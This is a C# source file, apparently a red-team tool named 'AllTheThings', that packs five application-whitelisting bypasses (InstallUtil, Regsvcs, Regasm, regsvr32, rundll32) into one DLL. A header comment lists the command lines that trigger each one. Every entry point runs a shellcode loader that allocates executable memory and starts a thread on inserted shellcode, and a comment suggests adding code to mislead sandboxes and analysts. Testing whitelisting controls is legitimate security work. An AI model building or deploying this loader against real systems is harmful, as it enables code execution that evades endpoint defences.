using System;
using System.Diagnostics;
using System.Reflection;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.EnterpriseServices;
using RGiesecke.DllExport;

/*
Author: Casey Smith, Twitter: @subTee
Modified by Chris Spehn, Twitter: @ConsciousHacker
License: BSD 3-Clause

For Testing Binary Application Whitelisting Controls

Includes 5 Known Application Whitelisting/ Application Control Bypass Techiniques in One File.
1. InstallUtil.exe
2. Regsvcs.exe
3. Regasm.exe
4. regsvr32.exe 
5. rundll32.exe



Usage:
1. 
    x86 - C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
    x64 - C:\Windows\Microsoft.NET\Framework64\v4.0.3031964\InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
2. 
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe AllTheThings.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe AllTheThings.dll
3. 
    x86 C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U AllTheThings.dll
    x64 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U AllTheThings.dll

4. 
    regsvr32 /s  /u AllTheThings.dll -->Calls DllUnregisterServer
    regsvr32 /s AllTheThings.dll --> Calls DllRegisterServer
5. 
    rundll32 AllTheThings.dll,EntryPoint
    
*/

[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]

public class Program
{
    public static void Main()
    {
        Console.WriteLine("Hello From Main...I Don't Do Anything");
        //Add any behaviour here to throw off sandbox execution/analysts :)
    }

}

public class Thing0
{
    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
      UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(
      UInt32 lpThreadAttributes,
      UInt32 dwStackSize,
      UInt32 lpStartAddress,
      IntPtr param,
      UInt32 dwCreationFlags,
      ref UInt32 lpThreadId
      );
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(
      IntPtr hHandle,
      UInt32 dwMilliseconds
      );
    public static void Exec()
    {
        /* length: 555 bytes */
        byte[] shellcode = new byte[] { INSERT_SHELLCODE_HERE };


        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
        MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr) (funcAddr), shellcode.Length);
		IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr pinfo = IntPtr.Zero;
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}

[System.ComponentModel.RunInstaller(true)]
public class Thing1 : System.Configuration.Install.Installer
{
    //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
    public override void Uninstall(System.Collections.IDictionary savedState)
    {

        Console.WriteLine("Hello There From Uninstall");
        Thing0.Exec();

    }

}

[ComVisible(true)]
[Guid("31D2B969-7608-426E-9D8E-A09FC9A51680")]
[ClassInterface(ClassInterfaceType.None)]
[ProgId("dllguest.Bypass")]
[Transaction(TransactionOption.Required)]
public class Bypass : ServicedComponent
{
    public Bypass() { Console.WriteLine("I am a basic COM Object"); }

    [ComRegisterFunction] //This executes if registration is successful
    public static void RegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute");
        Thing0.Exec();
    }

    [ComUnregisterFunction] //This executes if registration fails
    public static void UnRegisterClass(string key)
    {
        Console.WriteLine("I shouldn't really execute either.");
        Thing0.Exec();
    }

    public void Exec() { Thing0.Exec(); }
}

class Exports
{

    //
    // 
    //rundll32 entry point
    [DllExport("EntryPoint", CallingConvention = CallingConvention.StdCall)]
    public static void EntryPoint(IntPtr hwnd, IntPtr hinst, string lpszCmdLine, int nCmdShow)
    {
        Thing0.Exec();
    }
    [DllExport("DllRegisterServer", CallingConvention = CallingConvention.StdCall)]
    public static void DllRegisterServer()
    {
        Thing0.Exec();
    }
    [DllExport("DllUnregisterServer", CallingConvention = CallingConvention.StdCall)]
    public static void DllUnregisterServer()
    {
        Thing0.Exec();
    }

   

}

/*
Build errors:

Severity	Code	Description	Project	File	Line	Suppression State
Error		The "DllExportAppDomainIsolatedTask" task could not be instantiated from "C:\Users\lopi\Downloads\AllTheThings-master\AllTheThings-master\packages\UnmanagedExports.1.2.7\tools\RGiesecke.DllExport.MSBuild.dll". Could not load file or assembly 'RGiesecke.DllExport.MSBuild, Version=1.2.7.38851, Culture=neutral, PublicKeyToken=8f52d83c1a22df51' or one of its dependencies. Operation is not supported. (Exception from HRESULT: 0x80131515)	AllTheThings			
Error		The "DllExportAppDomainIsolatedTask" task has been declared or used incorrectly, or failed during construction. Check the spelling of the task name and the assembly name.	AllTheThings			
*/
